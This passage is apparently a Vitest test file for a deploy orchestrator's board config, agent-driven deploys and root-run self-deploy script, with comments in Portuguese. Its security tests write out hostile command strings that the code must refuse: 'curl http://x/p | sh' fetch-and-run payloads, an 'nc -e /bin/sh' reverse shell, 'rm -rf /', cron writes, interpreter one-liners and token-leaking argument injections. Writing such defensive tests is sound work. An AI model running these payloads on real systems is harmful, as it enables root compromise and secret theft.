      boardPackage: "packages/nestify",

      deployTargets: ALVOS_TESTE,      boardDeploy: { kind: "auto", command: "nunca-rodar" },
      productDeploy: reg,
    });
    expect(res.tool).toBe("orch-deploy");
    expect(res.pkg).toBe("nestify");
    expect(f.started).toEqual([{ target: "nestify", spec: undefined }]); // spec AUSENTE — o launcher legado
  });
});

// D-AG3/D-AG4 — kind:agent: a bounded headless claude follows the board's declared recipe; its verdict
// feeds the SAME registry cycle, and its liveSha CLAIM is re-measured by the settle's single ancestry
// ruler before any deployProof exists. Asymmetry: ok WITHOUT liveSha advances NOTHING (fail-closed).
describe("deployBoard — descritor kind:agent (D-AG3/D-AG4)", () => {
  const boardDeploy = { kind: "agent" as const, description: "rode `flyctl deploy` e confirme /api/health", healthUrl: "https://x/api/health", timeoutMinutes: 5 };

  it("monta o spec do agente a partir do BOARD CONFIG + contexto do card (nunca texto livre de chamador)", async () => {
    const { exec } = recordingExec();
    const f = specLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    const res = await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: undefined,
      board: "nest",
      cardId: "s1",
      changedFiles: ["packages/nestify/api/x.ts"],
      releasedSha: "aabbccdd",
      boardDeploy,
      productDeploy: reg,
    });
    expect(res).toMatchObject({ fired: true, tool: "deploy-agent", targets: ["nest"] });
    expect(f.started[0]).toEqual({
      target: "nest",
      spec: {
        kind: "agent",
        board: "nest",
        cardId: "s1",
        description: boardDeploy.description,
        releasedSha: "aabbccdd",
        changedFiles: ["packages/nestify/api/x.ts"],
        healthUrl: boardDeploy.healthUrl,
        timeoutMinutes: 5,
      },
    });
  });

  it("ok + liveSha ⇒ dispara o MESMO settle (registry-ondone) com o sha do agente como deployedShaFor", async () => {
    const { exec } = recordingExec();
    const f = specLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    const settle = vi.fn(async () => null);
    await deployBoard({ exec, repoRoot: "/repo", boardPackage: undefined, board: "nest", cardId: "s1", boardDeploy, productDeploy: reg, settle });

    f.setVerdict({ ok: true, liveSha: "eeff0011" });
    f.finish("nest", 0);
    await Promise.resolve(); // flush the subscriber's void-async

    expect(settle).toHaveBeenCalledTimes(1);
    const [b, c, o] = settle.mock.calls[0] as unknown as Parameters<DeploySettleFn>;
    expect([b, c, o.source]).toEqual(["nest", "s1", "registry-ondone"]);
    await expect(o.deps.deployedShaFor("nest")).resolves.toBe("eeff0011"); // a CLAIM entra na régua, não vira carimbo
  });

  it("ok SEM liveSha ⇒ NENHUM settle de prova disparado (assimetria D-AG4 — o card espera o humano)", async () => {
    const { exec } = recordingExec();
    const f = specLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    const settle = vi.fn(async () => null);
    await deployBoard({ exec, repoRoot: "/repo", boardPackage: undefined, board: "nest", cardId: "s1", boardDeploy, productDeploy: reg, settle });
    f.setVerdict({ ok: true }); // deploy ok, prova ausente
    f.finish("nest", 0);
    await Promise.resolve();
    expect(settle).not.toHaveBeenCalled();
  });

  it("falha do agente ⇒ NENHUM settle de prova (a reversão é do ciclo G3 onDone existente)", async () => {
    const { exec } = recordingExec();
    const f = specLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    const settle = vi.fn(async () => null);
    await deployBoard({ exec, repoRoot: "/repo", boardPackage: undefined, board: "nest", cardId: "s1", boardDeploy, productDeploy: reg, settle });
    f.setVerdict({ ok: false, reason: "flyctl quebrou" });
    f.finish("nest", 1);
    await Promise.resolve();
    expect(settle).not.toHaveBeenCalled();
  });

  it("kind:agent sem `description` ⇒ nada dispara, motivo legível", async () => {
    const { exec } = recordingExec();
    const f = specLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    const res = await deployBoard({ exec, repoRoot: "/repo", boardPackage: undefined, board: "nest", boardDeploy: { kind: "agent" }, productDeploy: reg });
    expect(res.fired).toBe(false);
    expect(res.reason).toMatch(/sem `description`/);
    expect(f.started).toEqual([]);
  });
});

// D-AG4, de ponta a ponta pelo ciclo REAL do deploy-truth: o settle do agente é o settleDeploySuccess de
// verdade (deps injetadas — zero fs/git), então "avança" aqui significa passar pela régua de ancestralidade,
// pelo carimbo deployProof e pelo checkGate hasDeployProof — o MESMO caminho gatado de qualquer deploy.
describe("deployBoard agent → ciclo settle→prova→avanço REAL (D-AG4)", () => {
  const makeConfig = (): BoardConfig =>
    ({
      id: "nest",
      name: "Nest",
      statuses: [
        { id: "deploy", name: "Publicar", onEnter: "promote-and-deploy" },
        { id: "concluida", name: "No ar", terminal: true, gate: "hasDeployProof" },
      ],
      releases: [],
      personas: [],
      systems: [],
      linkTypes: [],
    }) as unknown as BoardConfig;

  // Card COM código (stagedAt), parado no passo de deploy, com o alvo que o próprio deployBoard devolve
  // (targets:[board] — em produção o fireDeployBoard o carimba como deployTargets) e o watchdog armado.
  const makeCard = (): Card =>
    ({
      id: "s1",
      type: "story",
      status: "deploy",
      stagedAt: "2026-07-17",
      releasedSha: "aabbccdd",
      deployTargets: ["nest"],
      deployFiredAt: "2026-07-17T00:00:00.000Z",
    }) as unknown as Card;

  function realSettleInto(cardRef: { card: Card }, config: BoardConfig, containsOk: boolean) {
    let pending: Promise<unknown> | undefined;
    const settle: DeploySettleFn = (b, c, o) =>
      (pending = settleDeploySuccess(b, c, {
        source: o.source,
        deps: {
          ...o.deps, // deployedShaFor do deployBoard — o liveSha do agente entra AQUI, na mesma régua
          readConfig: async () => config,
          readBoardCards: async () => [cardRef.card],
          contains: async (anc, desc) => containsOk && anc === "aabbccdd" && desc === "eeff0011",
          write: (async (_b: string, _c: string, fn: (x: Card) => Card | null) => {
            const next = fn(cardRef.card);
            if (next) cardRef.card = next;
          }) as never,
          transition: (async () => {}) as never,
          reevaluate: async () => {},
        },
      }));
    return { settle, flush: async () => pending };
  }

  it("liveSha VERIFICÁVEL (releasedSha ∈ liveSha) ⇒ deployProof carimbado, watchdog limpo, card avança GATED ao terminal", async () => {
    const { exec } = recordingExec();
    const f = specLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    const ref = { card: makeCard() };
    const { settle, flush } = realSettleInto(ref, makeConfig(), true);
    await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: undefined,
      board: "nest",
      cardId: "s1",
      releasedSha: "aabbccdd",
      boardDeploy: { kind: "agent", description: "deploy via flyctl" },
      productDeploy: reg,
      settle,
    });
    f.setVerdict({ ok: true, liveSha: "eeff0011" });
    f.finish("nest", 0);
    await Promise.resolve();
    await flush();

    expect(ref.card.status).toBe("concluida"); // avançou pelo caminho gatado (hasDeployProof passou)
    expect(ref.card.deployProof).toMatchObject({ sha: "aabbccdd", targets: ["nest"], source: "registry-ondone" });
    expect(ref.card.deployFiredAt).toBeUndefined(); // settle COM prova limpa o watchdog
  });

  it("liveSha NÃO-ancestral (o agente alegou um sha que não contém o release) ⇒ prova negada, card FICA em Publicando", async () => {
    const { exec } = recordingExec();
    const f = specLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    const ref = { card: makeCard() };
    const { settle, flush } = realSettleInto(ref, makeConfig(), false); // git diz NÃO
    await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: undefined,
      board: "nest",
      cardId: "s1",
      releasedSha: "aabbccdd",
      boardDeploy: { kind: "agent", description: "deploy via flyctl" },
      productDeploy: reg,
      settle,
    });
    f.setVerdict({ ok: true, liveSha: "eeff0011" });
    f.finish("nest", 0);
    await Promise.resolve();
    await flush();

    expect(ref.card.status).toBe("deploy"); // o veredito do agente NUNCA carimba sozinho (D-AG4)
    expect(ref.card.deployProof).toBeUndefined();
    expect(ref.card.deployFiredAt).toBe("2026-07-17T00:00:00.000Z"); // watchdog segue armado → escala humano
  });

  it("ok SEM liveSha ⇒ o settle do canal (sem sha injetado) não prova nem avança — card em Publicando, watchdog armado", async () => {
    // O subscriber do deployBoard nem dispara (coberto acima); aqui o que se prova é o CICLO: o settle
    // que o canal SEMPRE roda (registry-ondone), sem evidência mensurável, SEGURA o card — fail-closed.
    const ref = { card: makeCard() };
    const config = makeConfig();
    const decision = await settleDeploySuccess("nest", "s1", {
      source: "registry-ondone",
      deps: {
        readConfig: async () => config,
        readBoardCards: async () => [ref.card],
        deployedShaFor: async () => null, // nenhum state file do alvo "nest" — o comando/agente não provou
        contains: async () => false,
        write: (async (_b: string, _c: string, fn: (x: Card) => Card | null) => {
          const next = fn(ref.card);
          if (next) ref.card = next;
        }) as never,
        transition: (async () => {}) as never,
        reevaluate: async () => {},
      },
    });
    expect(ref.card.status).toBe("deploy");
    expect(ref.card.deployProof).toBeUndefined();
    expect(ref.card.deployFiredAt).toBe("2026-07-17T00:00:00.000Z");
    expect(decision?.heldReason).toMatch(/alvo-sem-deploy/);
  });
});

// D-AG1 — the descriptor validates at the config boundary: a half-declared block is a LEGIBLE zod error
// (parseBoardConfig never throws), not a runtime crash nor a silent no-op deploy.
describe("BoardConfigSchema — bloco deploy do board.yaml (D-AG1)", () => {
  const baseCfg = { id: "b", name: "B", statuses: [], releases: [], personas: [], systems: [], linkTypes: [] };

  it("bloco válido (command) e bloco válido (agent) conformam", () => {
    expect(parseBoardConfig({ ...baseCfg, deploy: { kind: "command", command: "vercel deploy --prod" } }).ok).toBe(true);
    expect(parseBoardConfig({ ...baseCfg, deploy: { description: "rode flyctl deploy", healthUrl: "https://x/h", timeoutMinutes: 10 } }).ok).toBe(true);
    expect(parseBoardConfig(baseCfg).ok).toBe(true); // ausente segue válido (legado)
  });

  it("kind:command sem `command` ⇒ erro legível apontando o campo", () => {
    const r = parseBoardConfig({ ...baseCfg, deploy: { kind: "command" } });
    expect(r.ok).toBe(false);
    if (!r.ok) {
      const issue = r.issues.find((i) => i.path.join(".") === "deploy.command");
      expect(issue?.message).toMatch(/exige `command`/);
    }
  });

  it("kind:agent sem `description` ⇒ erro legível apontando o campo", () => {
    const r = parseBoardConfig({ ...baseCfg, deploy: { kind: "agent", command: "não substitui a receita" } });
    expect(r.ok).toBe(false);
    if (!r.ok) {
      const issue = r.issues.find((i) => i.path.join(".") === "deploy.description");
      expect(issue?.message).toMatch(/exige `description`/);
    }
  });

  it("kind desconhecido e timeout não-positivo ⇒ erros de schema (nunca crash)", () => {
    expect(parseBoardConfig({ ...baseCfg, deploy: { kind: "vercel" } }).ok).toBe(false);
    expect(parseBoardConfig({ ...baseCfg, deploy: { command: "x", timeoutMinutes: -5 } }).ok).toBe(false);
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────────────
// story-dlsxfj — o passo PRIVILEGIADO do deploy roda como ROOT e não pode interpretar dado como script
//
// O ATAQUE. `deploy.surfaces[].deployCmd` é uma string do `board.yaml`. Board-data é editado por humanos
// E por agentes, é path-disjunto do código e portanto não passa pelo gate de código — e essa string era
// entregue a `bash -lc` como SCRIPT, dentro de um unit transitório do systemd, como ROOT. Logo, quem
// conseguisse escrever uma linha de CONFIGURAÇÃO conseguia execução arbitrária como root:
//   deployCmd: "just sync-web-terminal; curl http://x/p | sh"
// Para o mecanismo, isso era indistinguível de "o comando que o dono declarou". Este repositório já
// pagou por essa classe uma vez (a injeção de shell no sweep-commit); é a mesma.
//
// A CORREÇÃO NÃO REMOVE O SELF-DEPLOY nem pede aprovação. O board continua declarando seu deploy: o que
// deixa de existir é o SHELL lendo o dado. O shell entra por um script FIXO e versionado (`exec "$@"`) e
// as palavras declaradas chegam como ARGUMENTOS POSICIONAIS, que shell nenhum re-interpreta.
// ─────────────────────────────────────────────────────────────────────────────────────────────────
describe("self-deploy — o passo privilegiado não interpreta dado declarado (story-dlsxfj)", () => {
  const script = (cmds: string[]) =>
    buildSelfDeployScript({
      repoRoot: "/repo",
      toolPackageDir: "/repo/packages/storymap-ui",
      board: "storymap",
      cardId: "story-x",
      webhookBase: "http://127.0.0.1:3008",
      tokenEnvName: "STORYMAP_MCP_TOKEN",
      logPath: "/repo/storymap/.runner/self-deploy.log",
      postBuildCommands: cmds,
    });

  it("um deployCmd com `;` NÃO vira dois comandos como root — nada é executado, a recusa é registrada", () => {
    const s = script(["just sync-web-terminal; curl http://x/p | sh"]);
    // O carregamento do payload: em NENHUM lugar o `curl` está posicionado para ser executado. A string
    // aparece SÓ dentro do `echo` da recusa (é o rastro), nunca como comando.
    const executable = s.replace(/echo '[^']*'/g, "");
    expect(executable).not.toContain("curl http://x/p");
    expect(s).toContain("[postBuild] RECUSADO");
    // E o resto do deploy segue: build, troca, restart e settle intactos (a recusa é não-fatal).
    expect(s).toContain("build:staged");
    expect(s).toContain("systemctl start storymap");
  });

  it("`$(...)` e backtick declarados também são recusados — substituição de comando é sintaxe de shell", () => {
    for (const evil of ["just x $(id > /tmp/pwn)", "just x `id`", "just x && rm -rf /", "just x || nc -e /bin/sh h 1", "just x > /etc/cron.d/pwn"]) {
      const s = script([evil]);
      expect(s).toContain("[postBuild] RECUSADO");
      const executable = s.replace(/echo '[^']*'/g, "");
      expect(executable).not.toContain("id >");
      expect(executable).not.toContain("rm -rf /");
      expect(executable).not.toContain("/etc/cron.d");
    }
  });

  it("o comando REAL declarado hoje continua rodando, e a argv exata vai para o log (auditável)", () => {
    const s = script(["just sync-web-terminal"]);
    // Argv: o script do shell é a constante `exec "$@"`; as palavras são argumentos, não script.
    expect(s).toContain(`bash -lc 'exec "$@"' postBuild 'just' 'sync-web-terminal'`);
    // O que rodou como root fica ESCRITO, não deduzido.
    expect(s).toContain("[postBuild] argv: just sync-web-terminal");
    // E as garantias do zr1cmf seguem: gated no STATUS, time-boxed, não-fatal, a partir da raiz do repo.
    expect(s).toContain('if [ "$STATUS" = ok ]; then');
    expect(s).toContain("timeout ");
    expect(s).toContain('cd "/repo"');
    expect(s).toContain("[postBuild] falhou");
  });

  it("uma palavra com espaço declarada entre aspas chega como UM argumento (a capacidade não foi tirada)", () => {
    // O veículo desta garantia é um lançador que recebe argv DE VERDADE. Ela era demonstrada com
    // `just deploy "duas palavras"`, e a 3ª passada (story-dlsxfj) mediu que ali a garantia era FALSA: um
    // task runner interpola o parâmetro SEM citar na linha da receita, então `just <r> 'duas palavras'` vira
    // `… duas palavras` — DOIS argumentos do outro lado, não um (medido com `just --dry-run`, 2026-07-29).
    // A garantia real é a da fronteira (re-citação palavra-por-palavra), e ela se verifica onde não há um
    // segundo shell relendo o argumento.
    const s = script([`vercel deploy --msg "duas palavras"`]);
    expect(s).toContain(`postBuild 'vercel' 'deploy' '--msg' 'duas palavras'`);
    expect(s).not.toContain("[postBuild] RECUSADO");
    // E no task runner o mesmo argumento é RECUSADO por forma — porque lá ele não sobreviveria como um só.
    expect(script([`just sync-web-terminal "duas palavras"`])).toMatch(/não é uma palavra literal/);
  });

  it("o OUTRO caminho privilegiado (`deploy.kind=command`) recusa sintaxe de shell — e não dispara nada", async () => {
    // Mesmo vetor, outro campo do MESMO board.yaml: `deploy.command` é executado por um login shell do
    // outro lado do registry. A régua vale na fronteira: o que não é argv não chega lá.
    const { exec } = recordingExec();
    const f = specLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    const res = await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: undefined,
      board: "nest",
      cardId: "s1",
      boardDeploy: { kind: "command", command: "vercel deploy --prod; curl http://x/p | sh" },
      productDeploy: reg,
    });
    expect(res.fired).toBe(false);
    expect(f.started).toEqual([]); // NADA foi despachado — nem a metade "boa" do comando
    expect(res.reason).toMatch(/sintaxe de SHELL/);

    // Contraprova: o comando declarado no exemplo do `_base` é argv e continua disparando.
    const ok = await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: undefined,
      board: "nest",
      cardId: "s2",
      boardDeploy: { kind: "command", command: "vercel deploy --prod" },
      productDeploy: new ProductDeployRegistry(f.launcher),
    });
    expect(ok.fired).toBe(true);
  });

  it("a régua do argv: palavras sim, sintaxe de shell não", () => {
    expect(parseDeclaredArgv("just sync-web-terminal")).toEqual(["just", "sync-web-terminal"]);
    // parseDeclaredArgv é SÓ o parser: ele diz se a string é uma lista de palavras, NÃO se essas palavras
    // podem ser executadas como root. Um interpretador é uma lista de palavras perfeitamente válida —
    // quem recusa isso é authorizeDeployCommand (ver o describe da allow-list logo abaixo).
    expect(parseDeclaredArgv(`bash -c 'curl http://x/p | sh'`)).toEqual(["bash", "-c", "curl http://x/p | sh"]);
    expect(parseDeclaredArgv("  just   a  b ")).toEqual(["just", "a", "b"]);
    expect(parseDeclaredArgv(`just --m "a b" 'c d'`)).toEqual(["just", "--m", "a b", "c d"]);
    // Metacaractere DENTRO de aspas é literal nos dois mundos → seguro, e preservado.
    expect(parseDeclaredArgv(`echo "a;b"`)).toEqual(["echo", "a;b"]);
    // Fora de aspas, cada um destes só significa algo para um shell → fail-closed.
    for (const bad of ["a; b", "a && b", "a | b", "a $X", "a $(b)", "a `b`", "a > f", "a < f", "a & ", "a {b}", "a (b)", "a *", "a ?", "a \\ b", "a\nb", "a #c", "a ~b", "a !b"]) {
      expect(parseDeclaredArgv(bad)).toBeNull();
    }
    expect(parseDeclaredArgv(`just "aberta`)).toBeNull(); // aspas não fechadas
    expect(parseDeclaredArgv("   ")).toBeNull();
    expect(parseDeclaredArgv("")).toBeNull();
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────────────
// story-dlsxfj (2ª passada) — A RÉGUA TEM DE SER SOBRE O QUE PODE SER EXECUTADO, NÃO SOBRE CARACTERES
//
// O ATAQUE que a régua de metacaractere NÃO impedia. O atacante não precisa de `;`/`|`/`$(…)` fora de
// aspas: basta declarar um INTERPRETADOR como `argv[0]` e mandar o payload DENTRO de aspas, onde a régua
// antiga não olha (por desenho — dentro de aspas o metacaractere é literal). `bash -c '<payload>'`,
// `sh -c`, `node -e`, `python3 -c`, `env FOO=1 bash …`, `/bin/sh -c` são todos "listas de palavras" —
// e `exec "$@"` executa fielmente o interpretador COM o script, como ROOT, a partir de uma linha de
// board-data que não passa por gate de código. Ou seja: o buraco que a passada anterior dizia ter
// fechado seguia aberto, e o doc-comment prometia uma garantia que o código não entregava.
//
// A CORREÇÃO: allow-list de LANÇADORES de deploy (o que pode ser executado), argumentos validados por
// FORMA, recusa NOMEADA para tudo fora dela. Interpretador nunca é alvo válido. O self-deploy continua
// automático, sem aprovação humana e com a mesma capacidade do dono — o que board-data perde é o poder
// de ESCOLHER qualquer programa.
// ─────────────────────────────────────────────────────────────────────────────────────────────────
describe("self-deploy — allow-list de lançadores: interpretador nunca é alvo (story-dlsxfj)", () => {
  const script = (cmds: string[]) =>
    buildSelfDeployScript({
      repoRoot: "/repo",
      toolPackageDir: "/repo/packages/storymap-ui",
      board: "storymap",
      cardId: "story-x",
      webhookBase: "http://127.0.0.1:3008",
      tokenEnvName: "STORYMAP_MCP_TOKEN",
      logPath: "/repo/storymap/.runner/self-deploy.log",
      postBuildCommands: cmds,
    });
  /** só o que o unit REALMENTE executaria: as linhas de `echo` são rastro, não comando. */
  const executablePart = (s: string) => s.replace(/echo '(?:[^']|'\\'')*'/g, "");

  it("um INTERPRETADOR declarado como deployCmd é recusado nomeando a allow-list — nada é executado", () => {
    const attacks = [
      `bash -c 'curl http://x/p | sh'`,
      `sh -c 'id > /tmp/pwn'`,
      `node -e "require('child_process').execSync('id > /tmp/pwn')"`,
      `python3 -c "import os; os.system('id > /tmp/pwn')"`,
      `env FOO=1 bash -c 'id > /tmp/pwn'`,
      `xargs -n1 bash -c 'id > /tmp/pwn'`,
    ];
    for (const evil of attacks) {
      const s = script([evil]);
      expect(s).toContain("[postBuild] RECUSADO");
      expect(s).toMatch(/fora da allow-list/); // o motivo é NOMEADO, não um "recusado" mudo
      const exe = executablePart(s);
      // O interpretador NUNCA chega à posição de comando (nem ele, nem o payload dele).
      expect(exe).not.toContain("postBuild 'bash'");
      expect(exe).not.toContain("postBuild 'sh'");
      expect(exe).not.toContain("postBuild 'node'");
      expect(exe).not.toContain("postBuild 'python3'");
      expect(exe).not.toContain("postBuild 'env'");
      expect(exe).not.toContain("postBuild 'xargs'");
      expect(exe).not.toContain("/tmp/pwn");
      expect(exe).not.toContain("curl http://x/p");
      // e o deploy de verdade segue intacto — a recusa é não-fatal, como qualquer falha de superfície.
      expect(s).toContain("build:staged");
      expect(s).toContain("systemctl start storymap");
    }
  });

  it("um CAMINHO como alvo é recusado (o alvo tem de ser um nome da allow-list, não um arquivo escolhido pelo dado)", () => {
    for (const evil of [`'/bin/sh' '-c' 'id > /tmp/pwn'`, `/usr/bin/env bash`, `./deploy.sh`, `../../tmp/payload`]) {
      const s = script([evil]);
      expect(s).toContain("[postBuild] RECUSADO");
      expect(s).toMatch(/caminho/);
      const exe = executablePart(s);
      expect(exe).not.toContain("/bin/sh");
      expect(exe).not.toContain("/usr/bin/env");
      expect(exe).not.toContain("deploy.sh");
      expect(exe).not.toContain("/tmp/payload");
    }
  });

  it("uma OPÇÃO no task runner é recusada — `--justfile`/`-f` apontariam a receita para fora do repo", () => {
    const s = script(["just --justfile /tmp/evil.just pwn"]);
    expect(s).toContain("[postBuild] RECUSADO");
    expect(s).toMatch(/receita/);
    expect(executablePart(s)).not.toContain("/tmp/evil.just");
    // -f é o mesmo vetor com o nome curto: a régua é de FORMA (nada que comece com `-`), não uma lista de flags.
    expect(script(["just -f /tmp/evil.just pwn"])).toContain("[postBuild] RECUSADO");
  });

  it("NÃO-REGRESSÃO: o deployCmd REAL de hoje continua sendo executado, com a argv exata no log", () => {
    const s = script(["just sync-web-terminal"]);
    expect(s).not.toContain("[postBuild] RECUSADO");
    expect(s).toContain(`bash -lc 'exec "$@"' postBuild 'just' 'sync-web-terminal'`);
    expect(s).toContain("[postBuild] argv: just sync-web-terminal");
    // as garantias do zr1cmf seguem: gated no STATUS, time-boxed, não-fatal, da raiz do repo
    expect(s).toContain('if [ "$STATUS" = ok ]; then');
    expect(s).toContain("timeout ");
    expect(s).toContain('cd "/repo"');
  });

  it("o OUTRO caminho privilegiado (`deploy.kind=command`) recusa o interpretador — e não despacha nada", async () => {
    const { exec } = recordingExec();
    const f = specLauncher();
    const res = await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: undefined,
      board: "nest",
      cardId: "s1",
      boardDeploy: { kind: "command", command: `bash -c 'curl http://x/p | sh'` },
      productDeploy: new ProductDeployRegistry(f.launcher),
    });
    expect(res.fired).toBe(false);
    expect(f.started).toEqual([]); // nada foi despachado
    expect(res.reason).toMatch(/fora da allow-list/);

    // NÃO-REGRESSÃO do mesmo caminho: o comando declarado no exemplo do `_base` continua disparando.
    const ok = await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: undefined,
      board: "nest",
      cardId: "s2",
      boardDeploy: { kind: "command", command: "vercel deploy --prod" },
      productDeploy: new ProductDeployRegistry(f.launcher),
    });
    expect(ok.fired).toBe(true);
  });

  it("kind=command: o que segue ao registry é a argv AUTORIZADA re-citada — o login shell não expande `$(…)` nem `$VAR`", async () => {
    // A DIVERGÊNCIA entre os dois lados da fronteira. O parser trata `"…"` como agrupamento LITERAL; o
    // `bash -lc` do outro lado do registry NÃO: dentro de aspas duplas ele EXPANDE `$VAR` e EXECUTA
    // `$(…)`. Enquanto a string crua seguia adiante, um alvo autorizado bastava — `vercel deploy --msg
    // "$(curl http://x/p | sh)"` roda o payload como root, e `"$STORYMAP_MCP_TOKEN"` vaza o segredo do
    // serviço para dentro dos argumentos. A fronteira normaliza: cada palavra autorizada vai citada.
    const { exec } = recordingExec();
    const f = specLauncher();
    const res = await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: undefined,
      board: "nest",
      cardId: "s1",
      boardDeploy: { kind: "command", command: `vercel deploy --msg "$(id > /tmp/pwn)"` },
      productDeploy: new ProductDeployRegistry(f.launcher),
    });
    expect(res.fired).toBe(true); // a capacidade do dono continua: o comando declarado roda
    const spec = f.started[0]?.spec as { kind: string; command: string };
    expect(spec.command).toBe(`'vercel' 'deploy' '--msg' '$(id > /tmp/pwn)'`);
    // nada de `$(` desprotegido chega ao shell — a substituição de comando morre como texto literal
    expect(spec.command).not.toContain(`"$(`);

    const leak = await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: undefined,
      board: "nest",
      cardId: "s2",
      boardDeploy: { kind: "command", command: `vercel deploy --msg "$STORYMAP_MCP_TOKEN"` },
      productDeploy: new ProductDeployRegistry(f.launcher),
    });
    expect(leak.fired).toBe(true);
    expect((f.started[1]?.spec as { command: string }).command).toBe(`'vercel' 'deploy' '--msg' '$STORYMAP_MCP_TOKEN'`);
  });

  it("a allow-list é do OPERADOR (env), nunca do board — e nem por env um interpretador entra", () => {
    // O adotante cuja publicação usa outro CLI estende a lista pelo env do serviço (systemd), que
    // board-data não alcança. A capacidade do dono continua inteira.
    const extended = resolveDeployLaunchers({ AGILEHARNESS_DEPLOY_LAUNCHERS: "pulumi, wrangler" });
    expect(extended).toContain("pulumi");
    expect(extended).toContain("just"); // o default nunca é substituído, só estendido
    expect(authorizeDeployCommand("pulumi up --yes", { launchers: extended }).refusal).toBeNull();
    // Trava do próprio knob: `bash`/`node`/`env` no env NÃO viram alvo (o buraco não volta por config).
    const reopened = resolveDeployLaunchers({ AGILEHARNESS_DEPLOY_LAUNCHERS: "bash node env sudo" });
    expect(reopened).not.toContain("bash");
    expect(reopened).not.toContain("node");
    expect(reopened).not.toContain("env");
    expect(reopened).not.toContain("sudo");
  });

  it("authorizeDeployCommand: a argv autorizada sai pronta; a recusa sai com motivo nomeado", () => {
    expect(authorizeDeployCommand("just sync-web-terminal").argv).toEqual(["just", "sync-web-terminal"]);
    expect(authorizeDeployCommand("vercel deploy --prod").argv).toEqual(["vercel", "deploy", "--prod"]);
    for (const [cmd, motivo] of [
      [`bash -c 'id'`, /fora da allow-list/],
      [`/bin/sh -c id`, /caminho/],
      ["just --justfile /tmp/x pwn", /receita/],
      ["just x; id", /sintaxe de SHELL/],
      ["", /sintaxe de SHELL|vazia/],
    ] as [string, RegExp][]) {
      const v = authorizeDeployCommand(cmd);
      expect(v.argv).toBeNull();
      expect(v.refusal).toMatch(motivo);
    }
    // Caractere de CONTROLE num argumento quebraria a linha de auditoria (o rastro do que rodou como
    // root) — e nenhum argumento de deploy real tem um. Recusado por FORMA.
    expect(authorizeDeployCommand(`just deploy "a\nb"`).refusal).toMatch(/controle/);
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────────────
// story-dlsxfj (3ª passada) — O PAYLOAD MUDOU DE LUGAR: SAIU DO ALVO E FOI PARA O ARGUMENTO
//
// O ATAQUE que a allow-list de LANÇADORES não impedia, porque ela olha só `argv[0]`. O atacante usa um
// lançador AUTORIZADO e põe o payload no ARGUMENTO — e a cadeia fecha porque um task runner NÃO passa
// parâmetro como argv: ele o cola COMO TEXTO na linha da receita, que então vai para um shell. Medido
// neste repo com `just --dry-run` (2026-07-29), sem nenhuma mudança de código:
//
//   just canary-check '$(curl http://x/p | sh)'
//     → node scripts/deploy/post-deploy-canary.js --url $(curl http://x/p | sh) --sha $(git rev-parse …)
//   just advance-card 'a; id' storymap
//     → ~/.bun/bin/bun packages/storymap-ui/scripts/advance-card.ts a; id storymap
//
// Nos dois casos o payload virou SINTAXE de shell, executada como ROOT, a partir de uma linha de board-data
// (`deploy.surfaces[].deployCmd` / `deploy.command`) que é path-disjunta do código e não passa pelo gate.
// Aspas na declaração não protegem nada: para o parser elas são agrupamento LITERAL e morrem ali; o que
// segue é a palavra crua, e é o `just` que a re-expõe a um shell. O repo tem ~40 receitas parametrizadas
// (`advance-card`, `canary-check`, `api-extract`, `dev-all`, `test-evidence`, `_deploy-preflight`, …),
// nenhuma escrita para receber dado hostil.
//
// A CORREÇÃO, por DESENHO e sem tirar capacidade: a régua passa a valer para a CADEIA — allow-list da
// RECEITA (o alvo secundário) e FORMA de PALAVRA para os argumentos dela. Extensível só pelo env do
// SERVIÇO. O `deployCmd` real de hoje (`just sync-web-terminal`) segue rodando, automático e sem aprovação
// humana; um lançador que NÃO é task runner (`vercel`) não perde nada, porque ali não existe segundo shell.
// ─────────────────────────────────────────────────────────────────────────────────────────────────
describe("self-deploy — a cadeia lançador→receita→argumento (story-dlsxfj, 3ª passada)", () => {
  const script = (cmds: string[]) =>
    buildSelfDeployScript({
      repoRoot: "/repo",
      toolPackageDir: "/repo/packages/storymap-ui",
      board: "storymap",
      cardId: "story-x",
      webhookBase: "http://127.0.0.1:3008",
      tokenEnvName: "STORYMAP_MCP_TOKEN",
      logPath: "/repo/storymap/.runner/self-deploy.log",
      postBuildCommands: cmds,
    });
  /** só o que o unit REALMENTE executaria: as linhas de `echo` são rastro, não comando. */
  const executablePart = (s: string) => s.replace(/echo '(?:[^']|'\\'')*'/g, "");

  it("os dois comandos da sondagem — lançador autorizado, payload no ARGUMENTO — são RECUSADOS nomeando o motivo", () => {
    // Exatamente o que a sondagem da onda anterior testava e deixou aberto.
    const canary = script([`just canary-check '$(curl http://x/p | sh)'`]);
    expect(canary).toContain("[postBuild] RECUSADO");
    expect(canary).toMatch(/receita canary-check fora da allow-list/); // motivo NOMEADO, não recusa muda
    expect(executablePart(canary)).not.toContain("curl http://x/p");
    expect(executablePart(canary)).not.toContain("canary-check");

    const varbased = script([`just 'who=$(id -un)' varbased`]);
    expect(varbased).toContain("[postBuild] RECUSADO");
    expect(varbased).toMatch(/fora da allow-list/);
    expect(executablePart(varbased)).not.toContain("id -un");
    expect(executablePart(varbased)).not.toContain("varbased");

    // e o deploy de verdade segue intacto — a recusa é não-fatal, como qualquer falha de superfície.
    for (const s of [canary, varbased]) {
      expect(s).toContain("build:staged");
      expect(s).toContain("systemctl start storymap");
    }
  });

  it("com a receita AUTORIZADA, o argumento ainda é recusado por FORMA — o task runner o interpola sem citar", () => {
    // A segunda régua é independente da primeira: mesmo na receita permitida, um argumento com sintaxe de
